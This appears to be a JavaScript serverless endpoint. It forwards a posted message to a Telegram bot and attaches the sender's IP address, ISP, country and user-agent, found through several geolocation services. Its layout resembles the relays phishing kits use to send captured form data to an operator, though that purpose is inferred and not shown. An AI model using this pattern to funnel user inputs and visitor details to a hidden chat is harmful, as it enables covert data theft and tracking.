// api/notify.js
const TOKEN         = process.env.TELEGRAM_TOKEN;
const CHAT          = process.env.CHAT_ID;
const IPINFO_TOKEN  = process.env.IPINFO_TOKEN || '';

// -----------------------------------------------------------------------------
async function geoLookup(ip) {
  let isp = 'inconnue';
  let country = 'inconnue';
  let countryCode = '';

  // 1️⃣ ipinfo.io --------------------------------------------------------------
  try {
    const r = await fetch(`https://ipinfo.io/${ip}/json${IPINFO_TOKEN ? `?token=${IPINFO_TOKEN}` : ''}`);
    if (r.ok) {
      const d = await r.json();
      if (d.org) isp = d.org.replace(/^AS\d+\s+/i, '');
      if (d.country) countryCode = d.country;
      if (isp !== 'inconnue' || countryCode) {
        country = countryCode;
        return { isp, countryCode, country };
      }
    }
  } catch {}

  // 2️⃣ ipwho.is --------------------------------------------------------------
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    const d = await r.json();
    if (d.success) {
      isp = d.org || isp;
      country = d.country || country;
      return { isp, countryCode: d.country_code, country };
    }
  } catch {}

  // 3️⃣ ip-api.com ------------------------------------------------------------
  try {
    const r = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,countryCode,isp`);
    const d = await r.json();
    if (d.status === 'success') {
      isp = d.isp.replace(/^AS\d+\s+/i, '') || isp;
      country = d.country || country;
      return { isp, countryCode: d.countryCode, country };
    }
  } catch {}

  return { isp, countryCode, country };
}

function fullCountryName(codeOrName) {
  if (!codeOrName) return 'inconnue';
  if (codeOrName.length === 2) {
    try {
      const dn = new Intl.DisplayNames(['fr'], { type: 'region' });
      return dn.of(codeOrName);
    } catch {
      return codeOrName;
    }
  }
  return codeOrName;
}

// -----------------------------------------------------------------------------
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { message } = req.body;
  if (!message) return res.status(400).json({ error: 'Missing message' });

  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country || countryCode);

  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: '2-digit' });
  const time = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // -------------------- format Telegram message ------------------------------
  const [header, ...rawLines] = message.split('\n');
  let text = `📝 ${header.trim()}`;

  // Ajout des lignes d'info (sans puce)
  rawLines.forEach(l => {
    if (!l.trim()) return;
    if (l.startsWith('Méthode:')) text += `\n${l.trim()}`;
    else text += `\n${l.trim()}`; // garder brut
  });

  // Saut de ligne
  text += `\n\n`;

  // Bloc standard
  text += `🗓️ Date & heure : ${date}, ${time}`;
  text += `\n🌐 IP Client     : ${ip}`;
  text += `\n🔎 ISP Client    : ${isp}`;
  text += `\n🌍 Pays Client   : ${countryDisplay}`;
  text += `\n📍 User-Agent    : ${ua}`;
  text += `\n©️ ${now.getFullYear()} ©️`;

  // Envoi Telegram
  const payload = { chat_id: CHAT, text, parse_mode: 'Markdown', disable_web_page_preview: true };
  const tg = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
  });

  const raw = await tg.text();
  return res.status(tg.ok ? 200 : tg.status).json({ ok: tg.ok, full: raw });
}
